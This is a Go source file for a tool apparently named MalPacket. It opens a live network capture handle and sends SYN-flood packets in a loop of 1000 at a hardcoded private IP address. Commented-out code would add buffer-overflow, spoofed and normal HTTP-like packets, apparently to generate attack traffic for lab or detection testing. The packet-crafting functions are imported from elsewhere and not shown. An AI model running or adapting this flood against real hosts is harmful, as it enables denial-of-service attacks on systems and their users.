package main

import (
	"fmt"
	"log"
	"math/rand"
	"time"

	"github.com/google/gopacket/pcap"

	a "MalPacket/MalPacketAtkMethods"
	h "MalPacket/helper"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

const targetIP = "192.168.0.135"

type PacketType string

const (
	SYNFlood         PacketType = "SYNFlood"
	BufferOverflow   PacketType = "BufferOverflow"
	SpoofPacket      PacketType = "SpoofPacket"
	NormalPacket     PacketType = "NormalPacket"
)

// const targetCount = 250 
func main() {
	
	device := h.GetDefaultInterface()
	h.Okay("Using network interface: %s\n", device.DeviceName)

	handle, err := pcap.OpenLive(device.DeviceName, 65535, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening device %s: %v", device.DeviceName, err)
	}
	defer handle.Close()

	// Simulate sending packets
	
	// packetCounts := map[PacketType]int{
	// 	SYNFlood:       0,
	// 	BufferOverflow: 0,
	// 	SpoofPacket:    0,
	// 	NormalPacket:   0,
	// }
	
	// for i := 0; i < 1000; i++ {
	// 	r := rand.Intn(100) // Generate a random number between 0 and 99
	
	// 	switch {
	// 	case r < 15 && packetCounts[SYNFlood] < targetCount:
	// 		a.GenerateSYNFlood(handle, targetIP, targetIP, 489, 800)
	// 		packetCounts[SYNFlood] += 800
	// 		h.Okay("SYN Packet Sent")
	
	// 	case r < 25 && packetCounts[BufferOverflow] < targetCount:
	// 		a.GenerateBufferOverFlowPacket(handle, targetIP, targetIP, 489, 80)
	// 		packetCounts[BufferOverflow]++
	// 		h.Okay("Buffer Overflow Packet Sent")
	
	// 	case r < 35 && packetCounts[SpoofPacket] < targetCount:
	// 		payload := generateHTTPPayload()
	// 		a.GenerateSpoofPacket(handle, targetIP, targetIP, 443, 443, payload)
	// 		packetCounts[SpoofPacket]++
	// 		h.Okay("Spoof Packet Sent")
	// 	default:
	// 		if packetCounts[NormalPacket] < targetCount {
	// 			payload := generateHTTPPayload()
	// 			encryptedPayload := simulateEncryptedPayload(payload)
	// 			h.SendTCPPacket(handle, targetIP, targetIP, 489, 80, encryptedPayload)
	// 			packetCounts[NormalPacket]++
	// 			h.Okay("Normal Packet Sent")
	// 		}
	// 	}

	// 	if packetCounts[SYNFlood] >= targetCount &&
	// 		packetCounts[BufferOverflow] >= targetCount &&
	// 		packetCounts[SpoofPacket] >= targetCount &&
	// 		packetCounts[NormalPacket] >= targetCount {
	// 		h.Okay("All packet types have reached the target count. Stopping.")
	// 		break
	// 	}

	// 	time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond)
	// }

	for i := 0; i < 1000; i++ {
		a.GenerateSYNFlood(handle, targetIP, targetIP, 489, 800)
		h.Okay("SYN Packet Sent")

		
		// a.GenerateBufferOverFlowPacket(handle, targetIP, targetIP, 489, 80)
		// h.Okay("Buffer Overflow Packet Sent")

	
		// payload := generateHTTPPayload()
		// encryptedPayload := simulateEncryptedPayload(payload)
		// h.SendTCPPacket(handle, targetIP, targetIP, 489, 80, encryptedPayload)
		// h.Okay("Normal Packet Sent")

		
		time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond)
	}
}

func generateHTTPPayload() []byte {
	paths := []string{"/", "/index.html", "/about", "/contact", "/products"}
	randomPath := paths[rand.Intn(len(paths))]
	return []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: example.com\r\n\r\n", randomPath))
}



func simulateEncryptedPayload(payload []byte) []byte {
	encryptedPayload := make([]byte, len(payload))
	_, err := rand.Read(encryptedPayload)
	if err != nil {
		log.Fatalf("Error generating random payload: %v", err)
	}
	return encryptedPayload
}



